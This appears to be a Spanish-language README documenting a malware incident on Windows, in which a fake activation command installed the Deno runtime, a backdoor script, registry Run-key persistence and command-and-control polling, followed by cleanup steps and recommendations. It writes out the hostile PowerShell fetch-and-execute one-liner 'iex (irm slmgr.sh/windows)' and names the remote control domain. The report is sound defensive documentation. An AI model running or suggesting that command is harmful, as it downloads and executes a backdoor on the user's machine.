# deno-backdoor-slmgr-sh-windows-incident

incidente y declaración para evidenciar el malware existente fechado en 10/07/2026

# Incidente de malware usando `iex (irm slmgr.sh/windows)` – Deno RAT / Backdoor

## Resumen


El día **[poner fecha]**, en un equipo con Windows, se detectó y neutralizó un malware que se instaló mediante el comando:

```powershell
iex (irm slmgr.sh/windows)
```

Este comando se presentaba como un supuesto “activador de Windows” usando el nombre `slmgr`, pero en realidad descargaba y ejecutaba un script malicioso que:

- Instaló silenciosamente el runtime **Deno**.
- Creó un archivo malicioso `5b2fce6.js` en el perfil del usuario.
- Registró una clave de inicio automático en el Registro de Windows.
- Se conectaba periódicamente a un servidor remoto para recibir comandos (posible RAT/backdoor).

Este repositorio documenta el incidente para servir como evidencia y referencia de análisis.

---

## Entorno afectado

- Sistema operativo: Windows (desktop)
- Usuario afectado: `djklm` (perfil local)
- Ruta de archivo malicioso:
  - `C:\Users\djklm\AppData\Roaming\5b2fce6.js`
- Clave de Registro utilizada para persistencia:
  - `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\5b2fce6`
- Runtime utilizado por el malware:
  - `deno.exe` (Deno JavaScript runtime)

---

## Vector de infección

El malware entró por la ejecución manual del comando de PowerShell:

```powershell
iex (irm slmgr.sh/windows)
```

Descripción técnica:

- `irm` (alias de `Invoke-RestMethod`) descarga contenido desde una URL remota.
- `iex` (alias de `Invoke-Expression`) ejecuta directamente el contenido descargado como código PowerShell.

Este patrón (`irm URL | iex` o `iex (irm URL)`) es muy utilizado en:

- Scripts de activación pirata de Windows/Office.
- Campañas de malware que quieren ejecutar código directamente desde internet sin mostrar el script al usuario.

En este caso, se abusó del nombre `slmgr` (herramienta legítima de licencias de Microsoft) para parecer una herramienta de activación confiable.

---

## Comportamiento del malware

Basado en la observación directa del sistema y el análisis del comportamiento:

1. **Instalación de Deno**
   - El script descargó e instaló el runtime **Deno** (similar a Node.js).
   - Deno se utilizó como motor para ejecutar código JavaScript malicioso.

2. **Archivo malicioso principal**
   - Se creó el archivo:
     - `C:\Users\djklm\AppData\Roaming\5b2fce6.js`
   - Este archivo contenía la lógica del backdoor/RAT que se ejecutaba mediante `deno.exe`.

3. **Persistencia en el sistema**
   - Se añadió una entrada en:
     - `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
   - Clave:
     - Nombre: `5b2fce6`
     - Valor: apuntando al script malicioso para ejecutarse en cada inicio de sesión.

4. **Comunicación con servidor remoto**
   - El script se conectaba cada ~30 segundos a un dominio remoto:
     - `bypass.gd`
   - Finalidad: actuar como canal de comando y control (C2), permitiendo:
     - Ejecución remota de comandos.
     - Posible exfiltración de datos.
     - Control continuo del equipo (RAT/backdoor).

---

## Acciones de respuesta

Una vez detectado el comportamiento malicioso, se realizaron las siguientes acciones:

1. **Detención del proceso**
   - Se identificó y detuvo el proceso:
     - `deno.exe`
   - Esto interrumpió la ejecución activa del backdoor.

2. **Eliminación de persistencia en el Registro**
   - Se accedió a:
     - `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
   - Se eliminó la clave:
     - `5b2fce6`
   - Resultado: el malware ya no se ejecuta en el inicio de sesión.

3. **Borrado del archivo malicioso**
   - Se eliminó el archivo:
     - `C:\Users\djklm\AppData\Roaming\5b2fce6.js`

4. **Verificación posterior**
   - Comprobación de que:
     - No existan procesos `deno.exe` activos.
     - No existan claves de arranque relacionadas.
     - No existan copias adicionales del script en `AppData`.

---

## Lecciones aprendidas

- Nunca ejecutar comandos PowerShell de la forma:
  - `irm [URL] | iex`
  - `iex (irm [URL])`
  sin:
  - Verificar el origen y reputación de la URL.
  - Revisar el código fuente descargado.
  - Probarlo primero en un entorno aislado (sandbox/VM).

- El uso de runtimes legítimos (como Deno, Node.js, etc.) para fines maliciosos complica la detección, porque:
  - Son herramientas firmadas y legítimas.
  - Pueden descargar y ejecutar código dinámico desde internet.

---

## Recomendaciones

Para cualquier persona que haya ejecutado comandos similares:

1. Revisar el Registro:
   - `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
2. Revisar carpetas:
   - `%AppData%\Roaming`
   - `%AppData%\Local`
3. Buscar:
   - Archivos `.js` sospechosos.
   - Tareas programadas desconocidas.
4. Ejecutar un análisis completo con un antivirus/antimalware actualizado.
5. Cambiar contraseñas si se sospecha posible acceso remoto.

---

## Aviso

Este repositorio tiene fines **educativos y de documentación de incidentes**.  
No se incluyen ni se distribuirán scripts maliciosos ni payloads, únicamente rutas, nombres y descripciones técnicas observadas en el sistema afectado.
